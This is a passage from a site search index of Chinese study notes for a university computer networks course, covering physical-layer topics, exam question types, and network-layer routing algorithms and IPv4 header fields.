<p>\u5f53\u8fd9\u4e2a\u7ad9\u70b9\u8981\u53d1\u90011\u7684\u65f6\u5019\uff0c\u53d1\u9001\u8fd9\u4e2a\u7801\u7247\u5e8f\u5217\uff0c\u8981\u53d1\u90010\u7684\u65f6\u5019\uff0c\u53d1\u9001\u8fd9\u4e2a\u7801\u7247\u5e8f\u5217\u7684\u53cd\u7801</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#6","title":"6. \u516c\u7528\u7535\u8bdd\u4ea4\u6362\u7f51\u7edc","text":"<p>2: Physical Layer - ZhengliangDuanfang-\u8ba1\u7b97\u673a\u7f51\u7edc \u53ef\u4ee5\u770b\u770b\u8fd9\u8fb9</p> <ul> <li>T1 \u662f 1.544</li> <li>E1 \u662f 2.048</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#7","title":"7. \u7269\u7406\u5c42\u8bbe\u5907","text":"<ul> <li> <p>\u4e2d\u7ee7\u5668 RP Repeater</p> </li> <li> <p>\u6574\u5f62 \u653e\u5927 \u5e76 \u8f6c\u53d1\u4fe1\u53f7</p> </li> <li>\u6ca1\u6709\u5b58\u50a8\u8f6c\u53d1\u7684\u529f\u80fd\uff0c\u4e24\u8fb9\u7684\u7f51\u6bb5\u5fc5\u987b\u4f7f\u7528\u540c\u4e00\u534f\u8bae</li> <li>\u4e92\u76f8\u4e32\u8054\u7684\u4e2d\u7ee7\u5668\u6700\u591a\u53ea\u80fd\u6709\u4e94\u4e2a</li> <li>\u653e\u5927\u5668</li> <li>\u8f6c\u53d1\u5668</li> <li> <p>\u96c6\u7ebf\u5668 Hub</p> </li> <li> <p>\u591a\u7aef\u53e3\u7684\u4e2d\u7ee7\u5668</p> </li> <li>\u534a\u53cc\u5de5</li> <li>\u5bf9\u4e8e\u8f93\u5165\u7684\u4fe1\u53f7\u6574\u5f62\u653e\u5927\uff0c\u7136\u540e\u8f6c\u53d1\u5230\u9664\u4e86\u8f93\u5165\u7aef\u53e3\u4ee5\u5916\u7684\u6240\u6709\u7aef\u53e3</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/#_2","title":"\u5e38\u89c1\u9898\u578b","text":"<ul> <li>symbol rate \u548c data rate \u7684\u8f6c\u6362</li> <li>\u5df2\u77e5\u4fe1\u566a\u6bd4\uff0c\u4fe1\u53f7\u7684\u8fdb\u5236\uff0c\u8ba1\u7b97 data rate</li> <li>\u901a\u8fc7\u7f16\u7801\u65b9\u5f0f\u548c\u6ce2\u5f62\u56fe\u8fdb\u884c\u76f8\u4e92\u8f6c\u6362\u8bb0\u5fc6</li> <li>CDMA \u7684\u751f\u6210\u548c\u62bd\u53d6</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\u8003\u5bdf\u9891\u5206\u590d\u7528</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u7ecf\u5178CDMA\u62bd\u53d6</li> </ul> <p>\u200b\u200b</p> <ul> <li>trunk \u5e38\u89c1\u7535\u8bdd\u7f51\u7edc\u8981\u53bb\u770b\u770b\uff0c\u8fd9\u9898lkj\u90a3\u8fb9\u4e5f\u51fa\u5230\u4e86</li> <li>T1\uff0cE1\u662f\u4ec0\u4e48\u4e1c\u897f\u554a</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u8fd9\u4e2a\u4e1c\u897f \u8981\u5c55\u5f00\u770b\u770b packet switch circuit switch message switch \u548c \u4e0b\u9762\u8fd9\u4e9b\u7684\u5173\u7cfb</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u738b\u9053\u539f\u9898\u82f1\u6587\u7248</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u4ee5\u4e0b\u54ea\u4e9b\u90e8\u5206\u662f\u5149\u4f20\u8f93\u7cfb\u7edf\u7684\u4e00\u90e8\u5206\uff0cB\u5c31\u662f\u534a\u5bfc\u4f53\u6fc0\u5149\u8bbe\u5907</li> </ul> <p>\u200b\u200b</p> <ul> <li>T1\u548cE1\uff0c\u8fd8\u6709\u8fd9\u4e2a15\u9898\uff0c\u7535\u8bdd\u7f51\u7edc\u7684\u95ee\u9898\u8981\u53bb\u770b\u770b\uff0c\u8fd9\u4e2a\u738b\u9053\u91cc\u6ca1\u6709</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u7535\u8bdd\u7f51\u7edc\u57fa\u4e8e circuit switching</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li> <p>BD \u5173\u4e8ebaud rate \u548c data rate \u4e4b\u95f4\u7684\u8f6c\u6362\u5173\u7cfb</p> </li> <li> <p>\u4ee5\u592a\u7f51\u4e2d baud rate &gt; data rate baud \u5360 0.5 \u4e2a bit</p> </li> <li>9\u9898\u4e2d data rate &gt; baud rate baud \u53604\u4e2abit\u7684\u65f6\u5019</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u91c7\u6837\u9891\u7387\u53ef\u4ee5\u8f6c\u6362\u6210\u5e26\u5bbd 8Hz * 2 * log16 = 64 ??? \u91c7\u6837\u9891\u7387\u8f6c\u6362\u6210\u5e26\u5bbd\u8981\u9664\u4ee52</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u770b\u4e0d\u61c2\u7684\u9898\u76ee C</li> </ul> <p>\u200b\u200b</p> <ul> <li>A PCM \u8fd9\u5757\u8981\u7406\u4e00\u7406 A 8000  * 2 / 2 * log128 \u91c7\u6837\u8f6c\u6362\u6210\u5e26\u5bbd\u8981\u9664\u4ee52</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> <li>16\u79cd\u91c7\u6837\u53ef\u80fd</li> </ul> <p>\u200b\u200b</p> <ul> <li>B\u63d0\u5230\u4e86\u4ee5\u592a\u7f51\uff0c\u662f\u534a\u53cc\u5de5 C</li> </ul> <p>\u200b\u200b</p> <ul> <li>B \u8981\u4e0d\u8fd8\u662f\u80cc\u9898\u5427</li> </ul> <p>\u200b\u200b</p> <ul> <li>CC</li> </ul> <p>\u200b\u200b</p> <ul> <li>A C</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u200b\u200b</p> <ul> <li>C</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/","title":"\u7f51\u7edc\u5c42","text":"<p>\u7f51\u7edc\u5c42\u662f\u7aef\u5230\u7aef\u7684\u6700\u5e95\u5c42\uff0c\u5b8c\u6210\u7684\u662f\u53d1\u9001\u65b9\u5230\u63a5\u6536\u65b9\u7684\u4e8b\u60c5\u3002\u5bf9\u4e8e\u4e00\u4e2a\u7f51\u7edc\u901a\u4fe1\u4efb\u52a1\u800c\u8a00\uff0c\u5176\u4e2d\u53ef\u80fd\u4f1a\u7ecf\u8fc7\u5f88\u591a\u8282\u70b9\uff0c\u8fd9\u4e9b\u8282\u70b9\u4e4b\u95f4\u6211\u4eec\u8003\u8651\u94fe\u8def\u5c42\u4ee5\u4e0b\u7684\u4e8b\u60c5\uff0c\u800c\u7f51\u7edc\u5c42\u63cf\u8ff0\u4e86\u8fd9\u6574\u4e2a\u901a\u4fe1\u4efb\u52a1\u7684\u5f00\u59cb\u548c\u7ed3\u5c3e</p> <ul> <li>\u7f51\u7edc\u5c42\u53ef\u80fd\u4f1a\u8de8\u8d8a\u4e0d\u540c\u7f51\u7edc</li> </ul> <p>\u6211\u4eec\u4f7f\u7528\u4e00\u4e9b\u4e2d\u95f4\u8bbe\u5907\uff0c\u53ef\u4ee5\u5c06\u4e24\u4e2a\u8ba1\u7b97\u673a\u7f51\u7edc\u8fde\u63a5\u8d77\u6765\uff0c\u6211\u4eec\u4e4b\u524d\u5b66\u4e60\u7684</p> <ul> <li>\u7269\u7406\u5c42\u7684 \u4e2d\u7ee7\u5668Repeater\uff0c\u96c6\u7ebf\u5668Hub</li> <li>\u94fe\u8def\u5c42\u7684 \u7f51\u6865Bridge\uff0c\u4ea4\u6362\u673aSwitch</li> </ul> <p>\u8fd9\u4e9b\u90fd\u5c5e\u4e8e\u4e2d\u95f4\u8bbe\u5907\uff0c\u4f46\u662f\u6211\u4eec\u8ba4\u4e3a\u8fd9\u4e9b\u8bbe\u5907\u53ea\u662f\u6269\u5927\u7684\u7f51\u7edc\uff0c\u8fd9\u4e9b\u8bbe\u522b\u8fde\u63a5\u8d77\u6765\u7684\u8282\u70b9\u4ecd\u7136\u5c5e\u4e8e\u540c\u4e00\u4e2a\u7f51\u7edc</p> <p>\u800c\u4e0d\u540c\u7f51\u7edc\u4e4b\u95f4\u771f\u6b63\u7684\u4e2d\u95f4\u8bbe\u5907\uff0c\u4e5f\u662f\u7f51\u7edc\u5c42\u6240\u7ba1\u7406\u7684\u8bbe\u5907\uff0c\u662f\u8def\u7531\u5668Router\uff0c\u4e3a\u5230\u6765\u7684\u8de8\u7f51\u7edc\u6570\u636e\u5305\u6839\u636e\u5176\u76ee\u7684\u5730\u627e\u5230\u4e00\u6761\u8def\u5f84\uff0c\u5e76\u4e14\u5bf9\u5e94\u5730\u5c06\u5176\u8f6c\u53d1</p> <p>\u5728\u66f4\u9ad8\u5c42\u8fd8\u6709\u7f51\u5173 Gateway \u8fd9\u4e2a\u4e2d\u95f4\u8bbe\u5907</p> <p>\u7531\u4e8e\u5386\u53f2\u539f\u56e0\uff0c\u8def\u7531\u5668\u6709\u65f6\u4e5f\u88ab\u79f0\u4e3a\u7f51\u5173</p> <p>\u8def\u7531\u8f6c\u53d1\u7684\u5927\u6982\u6d41\u7a0b\u662f\uff0c\u4e3b\u673a\u5c06\u6570\u636e\u5305\u53d1\u9001\u7ed9\u6700\u8fd1\u7684\u8def\u7531\u5668\uff0c\u8def\u7531\u5668store\u6570\u636e\u5305\uff0c\u76f4\u5230\u5176\u5b8c\u6210\u5230\u8fbe\u5e76\u4e14\u94fe\u8def\u5b8c\u6210\u6821\u9a8c\uff0c\u6570\u636e\u5305\u4f1a\u88ab\u8f6c\u53d1\u7ed9\u8def\u5f84\u4e0a\u7684\u4e0b\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u76f4\u5230\u5176\u8fbe\u5230\u76ee\u6807\u4e3b\u673a</p> <p>\u9664\u4e86\u5c06\u5f02\u6784\u7f51\u7edc\u4e92\u8054\uff0c\u901a\u8fc7\u8def\u7531\u8f6c\u53d1\u4e4b\u5916\uff0c\u7f51\u7edc\u5c42\u8fd8\u5173\u6ce8 \u62e5\u585e\u63a7\u5236\uff08congestion control\uff09\u548c \u670d\u52a1\u8d28\u91cf\uff08quality of service\uff09\u7b49\u8bdd\u9898</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#1","title":"1. \u63d0\u4f9b\u7ed9\u4f20\u8f93\u5c42\u7684\u670d\u52a1","text":"<p>\u65e0\u8fde\u63a5\u8fd8\u662f\u9762\u5411\u8fde\u63a5</p> <p>\u5728\u8bbe\u8ba1\u7f51\u7edc\u5c42\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u4ea7\u751f\u8fc7\u8981\u6295\u5165\u65e0\u8fde\u63a5\u8fd8\u662f\u9762\u5411\u8fde\u63a5\u7684\u4e89\u8bae</p> <ul> <li>\u9762\u5411\u8fde\u63a5\u66f4\u53ef\u9760\uff08OSI\u4e3b\u5f20\u8fd9\u4e2a</li> <li>\u65e0\u8fde\u63a5\u66f4\u5feb\uff08\u7f51\u7edc\u4e0a\u7684\u4efb\u4f55\u505a\u6cd5\u7ec8\u7a76\u662f\u4e0d\u53ef\u9760\u7684\uff09</li> </ul> <p>\u6700\u540e\u662f\u91c7\u7528\u4e86\u65e0\u8fde\u63a5\uff0c\u4f46\u662f\u5728\u53d1\u5c55\u8fc7\u7a0b\u4e2d\u4e5f\u5f15\u5165\u4e86\u9762\u5411\u8fde\u63a5\u7684\u7279\u6027\uff0c\u5927\u5bb6\u66f4\u52a0\u6ce8\u91cd\u670d\u52a1\u8d28\u91cf\u4e86\uff0c\u4e0e\u6b64\u76f8\u5173\u7684\u4e24\u4e2a\u9762\u5411\u8fde\u63a5\u6280\u672f\u662fMPLS\u548cVLAN</p> <p>\u5c4f\u853d\u8def\u7531\u6280\u672f</p> <p>\u4e0d\u8bba\u91c7\u7528\u54ea\u79cd\u670d\u52a1\uff0c\u90fd\u5e94\u8be5\u5c4f\u853d\u8def\u7531\u6280\u672f\u7684\u5177\u4f53\u5b9e\u73b0\u65b9\u5f0f\uff0c\u4f20\u8f93\u5c42\u53ef\u7528\u7684\u7f51\u7edc\u5730\u5740\u5e94\u8be5\u6709\u4e00\u5957\u53ef\u4ee5\u8de8\u8d8aLAN\u548cWAN\u7684\u7edf\u4e00\u7f16\u5740\u65b9\u6848</p> <p>\u65e0\u8fde\u63a5\u670d\u52a1\u7684\u5b9e\u73b0\uff1a\u6570\u636e\u62a5\u7f51\u7edc datagram network</p> <p>\u6211\u4eec\u5728\u7269\u7406\u5c42\u8ba8\u8bba\u4e86\u4e09\u79cd\u4e0d\u540c\u7684\u4ea4\u6362\u65b9\u5f0f\uff0c\u800c\u5728\u8fd9\u91cc\u6211\u4eec\u91c7\u7528\u5305\u4ea4\u6362 packet switching \u7684\u65b9\u5f0f</p> <p>\u5c06\u6bcf\u4e2a\u6570\u636e\u5305\u72ec\u7acb\u6ce8\u5165\u7f51\u7edc\u4e2d\uff0c\u5e76\u4e14\u4e3a\u6bcf\u4e2a\u6570\u636e\u5305\u72ec\u7acb\u8def\u7531\uff08\u5bf9\u6bcf\u4e2a\u6570\u636e\u5305\u90fd\u5206\u522b\u8fdb\u884c\u4e00\u6b21\u5bfb\u8def\uff09\u3002\u5728\u8be5\u65b9\u5f0f\u4e2d\uff0c\u6211\u4eec\u5c06\u6570\u636e\u5305\u79f0\u4e3a \u6570\u636e\u62a5 datagram\uff0c\u5e76\u4e14\u5c06\u8be5\u79cd\u7f51\u7edc\u79f0\u4e3a \u6570\u636e\u62a5\u7f51\u7edc datagram network</p> <p>\u5728\u8fd9\u79cd\u65b9\u5f0f\u4e2d\uff0c\u6bcf\u4e2a\u6570\u636e\u62a5\u7684\u9996\u90e8\u8981\u4fdd\u5b58\u8d77\u76ee\u7684\u5730\u5740\uff0c\u8def\u7531\u5668\u6839\u636e\u8be5\u5730\u5740\u8fdb\u884c\u5bfb\u8def</p> <p>\u200b\u200b</p> <p>\u6bcf\u4e2atable\u4fdd\u5b58\u4e86\uff0c\u6211\u4ece\u81ea\u5df1\u5230\u7b2c\u4e00\u5217\u7684\u76ee\u6807\uff0c\u9700\u8981\u5148\u5230\u54ea\u91cc\uff08\u7b2c\u4e8c\u5217\uff09</p> <p>\u4f18\u70b9</p> <ul> <li>\u7f51\u7edc\u9020\u4ef7\u964d\u4f4e\uff0c\u8fd0\u884c\u65b9\u5f0f\u7075\u6d3b</li> <li>\u5e94\u5bf9\u6545\u969c\u7684\u80fd\u529b\u5f3a</li> <li>\u4e0d\u4f1a\u72ec\u5360\u67d0\u4e9b\u7535\u8def</li> <li>\u5206\u7ec4\u4fdd\u6301\u7684\u6e90\u5730\u5740\u548c\u76ee\u6807\u5730\u5740</li> </ul> <p>\u7f3a\u70b9</p> <ul> <li>\u4e0d\u4fdd\u8bc1\uff0c\u6709\u5e8f\uff0c\u53ef\u9760</li> </ul> <p>\u9762\u5411\u8fde\u63a5\u7684\u670d\u52a1\u5b9e\u73b0 \u865a\u7535\u8def\u7f51\u7edc virtual-circuit network</p> <p>\u4e5f\u662f\u5305\u4ea4\u6362\uff0c\u4e0d\u662f\u7ed9\u6bcf\u4e2a\u6570\u636e\u5305\u9009\u62e9\u4e00\u6761\u8def\u5f84\uff0c\u800c\u662f\u5efa\u7acb\u4e00\u4e2a\u8fde\u63a5\uff0c\u9009\u62e9\u4e00\u6761\u56fa\u5b9a\u7684\u8def\u5f84\uff0c\u9700\u8981\u8fd9\u4e2a\u8fde\u63a5\u7684\u90fd\u8d70\u8fd9\u4e2a\u8def\u5f84</p> <p>\u4e3a\u4ec0\u4e48\u53eb\u865a\u7535\u8def\uff0c\u662f\u56e0\u4e3a\u8fd9\u4e2a\u8fde\u63a5\u5e76\u4e0d\u5b58\u5728\uff0c\u53ea\u662f\u903b\u8f91\u4e0a\u5b58\u5728</p> <p>\u6bcf\u4e2a\u8fde\u63a5\u6709\u4e00\u4e2a\u8fde\u63a5\u6807\u8bc6\u7b26 connection identifier\uff08\u4e0b\u9762\u76841\uff0c2\u8fd9\u4e9b\u4e1c\u897f\uff09\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e2d\uff0c\u6bcf\u4e2a\u6570\u636e\u62a5\u4e0d\u9700\u8981\u4fdd\u5b58\u76ee\u7684\u5730\u5740\uff0c\u800c\u662f\u4fdd\u5b58 connection identifier\uff0c\u5efa\u7acb\u5b8c\u865a\u7535\u8def\u4e4b\u540e\uff0c\u7535\u8def\u91cc\u7684\u8282\u70b9\u90fd\u4fdd\u7559\u7740\u8be5VCID\uff0c\u800c\u6211\u4eec\u4f20\u8f93\u7684\u5206\u7ec4\u4e5f\u6709VCID\uff0c\u6839\u636e\u8fd9\u4e9b\u5185\u5bb9\u5c31\u53ef\u4ee5\u5b8c\u6210\u8def\u7531\u8f6c\u53d1\u4e86</p> <p>\u200b\u200b</p> <p>\u865a\u7535\u8def\u7684\u4f18\u70b9</p> <ul> <li>\u53ef\u9760\uff0c\u6709\u5e8f</li> <li>\u5bf9\u4e8e\u957f\u65f6\u95f4\u7684\u9891\u7e41\u6570\u636e\u4ea4\u6362\u5b58\u5728\u4f18\u52bf</li> <li>\u5206\u7ec4\u5185\u90e8\u6ca1\u6709\u76ee\u7684\u5730\u5740\uff0c\u5305\u542bVCID\uff0c\u4e5f\u5c31\u662f\u865a\u7535\u8def\u53f7</li> </ul> <p>\u7f3a\u70b9</p> <ul> <li>\u865a\u7535\u8def\u9700\u8981\u5efa\u7acb-&gt;\u4f20\u8f93-&gt;\u62c6\u9664\uff0c\u6709\u5f00\u9500</li> <li>\u4e00\u65e6\u5176\u4e2d\u4e00\u4e2a\u8282\u70b9\u6216\u4e00\u6761\u94fe\u8def\u51fa\u73b0\u4e86\u95ee\u9898\uff0c\u6574\u4e2a\u865a\u7535\u8def\u90fd\u65e0\u6cd5\u4f7f\u7528</li> </ul> <p>\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7f51\u7edc\u4f20\u8f93\u4e2d\u662f\u5426\u6709\u786e\u8ba4\uff0c\u548c\u7f51\u7edc\u5c42\u7684\u9009\u62e9\u6ca1\u6709\u4efb\u4f55\u5173\u7cfb</p> <ul> <li>MPLS \u4f3c\u4e4e\u4e0d\u8003</li> </ul> <p>\u4e24\u79cd\u7f51\u7edc\u7684\u6bd4\u8f83</p> <p>\u200b\u200b</p> <p>\u5176\u5b9e\u5c31\u662f\u5404\u6709\u4f18\u52a3</p> <p>SDN Software Defined Network \u4f3c\u4e4e\u4e0d\u8003\uff1f</p> <p>\u62e5\u585e\u63a7\u5236</p> <ul> <li>\u6ce8\u610f\u548c\u94fe\u8def\u5c42\u7684\u6d41\u91cf\u63a7\u5236\u505a\u4e00\u4e2a\u533a\u5206</li> <li>\u5f00\u73af\u63a7\u5236\uff0c\u4e00\u79cd\u9759\u6001\u7684\u63a7\u5236\u65b9\u6cd5\uff0c\u5728\u8bbe\u8ba1\u7f51\u7edc\u7684\u65f6\u5019\u5c31\u89c4\u5b9a\u597d\uff0c\u800c\u4e2d\u9014\u4e0d\u4fee\u6539</li> <li>\u95ed\u73af\u63a7\u5236\uff0c\u4e00\u79cd\u52a8\u6001\u7684\u63a7\u5236\u65b9\u6cd5\uff0c\u5b9e\u65f6\u76d1\u63a7\u7f51\u7edc\u72b6\u6001\uff0c\u57fa\u4e8e\u53cd\u9988\u73af\u8def\u7684\u8bbe\u8ba1</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#2","title":"2. \u8def\u7531\u7b97\u6cd5","text":"<p>\u8def\u7531\u5668\u7684\u529f\u80fd\u5c31\u662f \u8def\u7531 routing \u548c \u8f6c\u53d1 forwarding \u3002</p> <ul> <li>\u8def\u7531\u5c31\u662f\u6839\u636e\u7279\u5b9a\u7684\u8def\u7531\u7b97\u6cd5\u6765\u6784\u9020\u51fa\u8def\u7531\u8868\uff0c\u540c\u65f6\u4e0d\u65ad\u8fdb\u884c\u66f4\u65b0\u7ef4\u62a4</li> <li>\u8f6c\u53d1\u5c31\u662f\u6839\u636e\u5230\u6765\u7684\u6570\u636e\u5305\u5185\u5bb9\u67e5\u8be2\u8def\u7531\u8868\uff0c\u5e76\u4ece\u5408\u9002\u7684\u7aef\u53e3\u8f6c\u53d1\u51fa\u53bb</li> </ul> <p>\u8def\u7531\u7b97\u6cd5\u4e00\u822c\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd</p> <ul> <li>\u9759\u6001\u8def\u7531 static routing / \u975e\u9002\u5e94\u6027\u7b97\u6cd5 nonadaptive algorithm  \u7b80\u5355\u4e14\u5f00\u9500\u8f83\u5c0f\uff0c\u5728\u62d3\u6251\u53d8\u5316\u4e0d\u5927\uff0c\u8def\u7531\u9009\u62e9\u6e05\u695a\u7684\u573a\u5408\u5f88\u6709\u7528\uff1b\u4f46\u662f\u4e0d\u4f1a\u52a8\u6001\u8c03\u6574\u4e5f\u5c31\u65e0\u6cd5\u5e94\u5bf9\u6545\u969c\u548c\u4f18\u5316\u8def\u7531</li> <li>\u52a8\u6001\u8def\u7531 dynamic routing / \u9002\u5e94\u6027\u7b97\u6cd5 dapative algorithm \u80fd\u591f\u6539\u5584\u7f51\u7edc\u6027\u80fd\uff0c\u6709\u52a9\u4e8e\u6d41\u91cf\u63a7\u5236\uff0c\u53d7\u6545\u969c\u5f71\u54cd\u5c0f\uff0c\u4f46\u662f\u7b97\u6cd5\u8f83\u4e3a\u590d\u6742\uff0c\u4f1a\u589e\u52a0\u7f51\u7edc\u8d1f\u62c5\uff0c\u5982\u679c\u53d8\u5316\u592a\u5feb\u5bb9\u6613\u5f15\u8d77\u9707\u8361\uff0c\u53d8\u5316\u8fc7\u6162\u4f1a\u5f71\u54cd\u8def\u7531\u4e00\u81f4\u6027</li> </ul> <p>\u200b\u200b</p> <p>\u6700\u4f18\u5316\u8def\u7531\u7684\u7ed3\u679c\u4e00\u5b9a\u662f\u4e00\u9897\u6811\uff0c\u5176\u5b9e\u5c31\u662f\u6bcf\u4e2a\u8def\u7531\u5efa\u7acb\u8d77\u81ea\u5df1\u7684slink tree\u5c31\u884c\u4e86</p> <p>shortest path</p> <p>\u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u6709\u4e24\u4e2a\u5185\u5bb9\uff0c\u4e00\u4e2a\u662f\u6211\u4eec\u5982\u4f55\u53bb\u8861\u91cf\u4e00\u4e2apath length</p> <p>\u200b\u200b</p> <p>\u53e6\u4e00\u4e2a\u5c31\u662f\u627e\u6700\u77ed\u8def\uff0c\u5c31\u662fDijkstra\u7b97\u6cd5</p> <p>\u200b\u200b</p> <p>Flooding</p> <p>\u5c31\u662f\u5f53\u6211\u4eec\u6536\u5230\u4e00\u4e2a\u5305\uff0c\u6211\u4eec\u628a\u5305\u5411\u9664\u4e86\u5176\u6765\u7684\u90a3\u4e2a\u7aef\u53e3\u4ee5\u5916\u7684\u6240\u6709\u7aef\u53e3\uff0c\u90fd\u53d1\u4e00\u904d</p> <p>How to damp the flooding process</p> <ul> <li>\u6211\u5bf9\u6570\u636e\u5305\u7ef4\u6301\u4e00\u4e2a\u6570\uff0c\u6bcf\u7ecf\u8fc7\u4e00\u8df3\u5c06\u8fd9\u4e2a\u6570\u51cf\u4e00\uff0c\u76f4\u5230\u5176\u4e3a0\u7684\u65f6\u5019\u5c06\u8be5\u5305\u4e22\u5f03</li> <li>\u6211\u5bf9\u8def\u7531\u5668\u7ef4\u62a4\u4e00\u4e2a\u6765\u8fc7\u7684\u6570\u636e\u5305\u7684\u4fe1\u606f\uff0c\u5f53\u6709\u4e2a\u6570\u636e\u5305\u53c8\u4e00\u6b21\u6765\u5230\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c06\u5176\u4e22\u5f03</li> </ul> <p>Flooding\u7684\u574f\u5904\u662f\u5f00\u9500\u5927\uff0c\u597d\u5904\u5728\u4e8e\u5b83\u51e0\u4e4e\u80af\u5b9a\u80fd\u627e\u5230\u5bf9\u5e94\u7684\u8def\u5f84\uff08\u53ea\u8981\u6709\u53ef\u7528\u7684\u8def\u5f84\uff09</p> <p>Distance Vector Routing / Bellman-Ford Routing</p> <p>\u6bcf\u4e00\u4e2a\u8282\u70b9\u7ef4\u62a4\u4e00\u4e2a\u8868\uff0c\u7ef4\u62a4\u7684\u662f\u6211\u5230\u67d0\u4e2a\u8282\u70b9\u7684\u6700\u77ed\u8def\u662f\u591a\u5c11</p> <p>\u200b\u200b</p> <p>\u5f53\u6211\u4eec\u9700\u8981\u8f6c\u53d1\u7684\u65f6\u5019</p> <p>\u6bd4\u5982J\u8981\u5230F\uff0c\u6211\u4eec\u8ba9J\u6240\u6709\u76f8\u90bb\u7684\u8282\u70b9\uff0c\u628a\u5b83\u4eec\u7684\u8868\u53d1\u8fc7\u6765\uff0c\u6211\u4eec\u89c2\u5bdf\u4e00\u4e0b\u8fd9\u4e9b\u76f8\u90bb\u7684\u8868\u54ea\u4e2a\u79bbF\u6700\u8fd1\uff08\u5f53\u7136\u8fd8\u8981\u8ba1\u7b97\u4e0aJ\u5230\u8be5\u76f8\u90bb\u8282\u70b9\u7684\u8ddd\u79bb\uff09\uff0c\u8fdb\u884c\u8f6c\u53d1</p> <p>\u6211\u4eec\u5c06\u8fd9\u79cd\u548c\u90bb\u5c45\u4ea4\u6362\u4fe1\u606f\u5f97\u5230\u7ed3\u679c\u7684\u7b97\u6cd5\u79f0\u4e3a\u6536\u655b convergence</p> <ul> <li>\u66f4\u65b0\u6700\u4f73\u8def\u5f84\u7684\u7f3a\u9677</li> </ul> <p>\u9996\u5148\uff0c\u6211\u4eec\u5047\u8bbe\u6709ABC\u4e09\u4e2a\u70b9\uff0c\\(A\\rightarrow B\\rightarrow C\\)\uff0c\u9996\u5148A\u4eceB\u90a3\u8fb9\u4ea4\u6362\u5f97\u5230\u4fe1\u606f\uff0c\u6211\u80fd\u4eceB\u5230C\uff1b\u7136\u540e\u8fd9\u65f6\u5019B\u5230C\u7684\u94fe\u8def\u65ad\u4e86\uff0c\u6b64\u65f6B\u518d\u8fdb\u884c\u67e5\u8be2\uff0c\u5b83\u4f1a\u53d1\u73b0A\u90a3\u8fb9\u8bb0\u5f55\u7740\u4e00\u6761\u5230C\u7684\u94fe\u8def\uff08\u5b83\u4e0d\u77e5\u9053\u8fd9\u6761\u94fe\u8def\u662f\u5426\u901a\u8fc7\u4e86\u81ea\u5df1\uff09\uff0c\u5b83\u53c8\u4ee5\u4e3a\u81ea\u5df1\u53ef\u4ee5\u4eceA\u5230C\uff0c\u6b64\u65f6\u5c31\u53d1\u751f\u4e86\u9519\u8bef</p> <p>Link State Routing</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#3-ipv4","title":"3. IPV4","text":"<p>IPV4\u662f\u5f53\u524d\u4f7f\u7528\u7684IP\u534f\u8bae\u7684\u4e00\u79cd</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9C%E5%B1%82/#31-ipv4","title":"3.1 IPV4 \u5206\u7ec4","text":"<p>\u200b\u200b</p> <p>\u8fd9\u4e2a\u5206\u7ec4\u7684\u683c\u5f0f\u6709\u4e00\u4e9b\u9700\u8981\u8bb0\u5fc6\u7684\u90e8\u5206</p> <ul> <li>IHL \u9996\u90e8\u957f\u5ea6\uff0c\u53604\u4f4d\uff0c\u4ee54B\u4e3a\u5355\u4f4d\uff0c\u4f8b\u5982\u5176\u4e3a15\u7684\u65f6\u5019\u6700\u5927\uff0c\u90a3\u4e48\u9996\u90e8\u6b64\u65f6\u4e3a60B\uff0c\u6700\u5e38\u89c1\u7684\u60c5\u51b5\u662f5</li> <li>Total length\u603b\u957f\u5ea6\uff0c\u536016\u4f4d\uff0c\u6307\u7684\u662f\u9996\u90e8\u548c\u6570\u636e\u90e8\u5206\u4e4b\u548c\uff0c\\(2^{16}-1\\)</li> <li>identification\uff1a\u6807\u8bc6\u4e00\u4e2aIP\u6570\u636e\u62a5\uff0c\u7531\u4e8eIP\u6570\u636e\u62a5\u672c\u8eab\u5f80\u5f80\u5927\u4e8e\u94fe\u8def\u5c42\u5e27\u7684\u5927\u5c0f\uff0c\u56e0\u6b64IP\u6570\u636e\u62a5\u4f1a\u88ab\u62c6\u5206\u6210\u7247\uff0c\u6211\u4eec\u8981\u786e\u8ba4\u4e00\u4e9b\u7247\u662f\u5426\u5c5e\u4e8e\u540c\u4e00\u4e2aIP\u6570\u636e\u62a5\uff0c\u5c31\u4f9d\u8d56\u8fd9\u4e2a\u5b57\u6bb5</li> <li>DF=0\u65f6\uff0c\u5141\u8bb8\u5206\u7247</li> <li>MF=1\uff0c\u8868\u793a\u540e\u9762\u8fd8\u6709\u5206\u7247\uff0cMF=0\uff0c\u8868\u793a\u540e\u9762\u6ca1\u6709\u4e86</li> <li>Fragment offset 